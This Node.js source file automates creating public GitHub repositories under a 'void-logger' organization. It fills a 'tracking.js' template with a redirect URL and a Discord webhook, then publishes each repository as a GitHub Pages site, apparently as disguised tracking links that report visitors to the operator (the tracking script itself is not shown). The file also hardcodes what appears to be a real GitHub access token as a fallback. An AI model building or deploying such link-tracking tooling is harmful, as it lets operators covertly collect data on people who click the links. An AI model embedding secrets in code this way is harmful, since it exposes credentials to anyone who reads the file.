
// Server-side implementation for creating GitHub repositories
const { Octokit } = require("@octokit/rest");
const fs = require('fs');
const path = require('path');

// Configuration
const config = {
    githubToken: process.env.GITHUB_TOKEN || "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",
    organization: "void-logger", // GitHub organization name
    templateDir: path.join(__dirname, '../github-template') // Path to template files
};

// Initialize Octokit
const octokit = new Octokit({
    auth: config.githubToken
});

/**
 * Create a GitHub repository for tracking
 * @param {string} name - Repository name
 * @param {string} destinationUrl - URL to redirect to
 * @param {string} discordWebhook - Discord webhook URL for notifications
 * @returns {Promise<string>} - Repository URL
 */
async function createTrackingRepo(name, destinationUrl, discordWebhook) {
    try {
        console.log(`Creating repository: ${name}-void`);
        
        // Create repository
        const repo = await octokit.repos.createInOrg({
            org: config.organization,
            name: `${name}-void`,
            description: `Tracking repository for ${name}`,
            private: false,
            auto_init: true
        });
        
        console.log(`Repository created: ${repo.data.html_url}`);
        
        // Wait a moment for the repository to initialize
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Read template files
        const indexHtml = fs.readFileSync(path.join(config.templateDir, 'index.html'), 'utf8');
        const stylesCss = fs.readFileSync(path.join(config.templateDir, 'styles.css'), 'utf8');
        let trackingJs = fs.readFileSync(path.join(config.templateDir, 'tracking.js'), 'utf8');
        
        // Replace placeholders in tracking.js
        trackingJs = trackingJs
            .replace('{{DESTINATION_URL}}', destinationUrl)
            .replace('{{DISCORD_WEBHOOK}}', discordWebhook || '')
            .replace('{{TRACKING_ID}}', `${name}-${Date.now()}`);
        
        // Create files in the repository
        await Promise.all([
            createFile(name, 'index.html', indexHtml),
            createFile(name, 'styles.css', stylesCss),
            createFile(name, 'tracking.js', trackingJs)
        ]);
        
        console.log(`Files created in repository: ${name}-void`);
        
        // Enable GitHub Pages
        await octokit.repos.createPagesSite({
            owner: config.organization,
            repo: `${name}-void`,
            source: {
                branch: "main",
                path: "/"
            }
        });
        
        console.log(`GitHub Pages enabled for: ${name}-void`);
        
        // Return the GitHub Pages URL
        return `https://${name}-void.github.io`;
    } catch (error) {
        console.error('Error creating repository:', error);
        throw new Error(`Failed to create repository: ${error.message}`);
    }
}

/**
 * Create a file in the repository
 * @param {string} repoName - Repository name
 * @param {string} filePath - File path
 * @param {string} content - File content
 * @returns {Promise<void>}
 */
async function createFile(repoName, filePath, content) {
    try {
        await octokit.repos.createOrUpdateFileContents({
            owner: config.organization,
            repo: `${repoName}-void`,
            path: filePath,
            message: `Add ${filePath}`,
            content: Buffer.from(content).toString('base64'),
            branch: "main"
        });
        
        console.log(`File created: ${filePath}`);
    } catch (error) {
        console.error(`Error creating file ${filePath}:`, error);
        throw error;
    }
}

module.exports = {
    createTrackingRepo
};
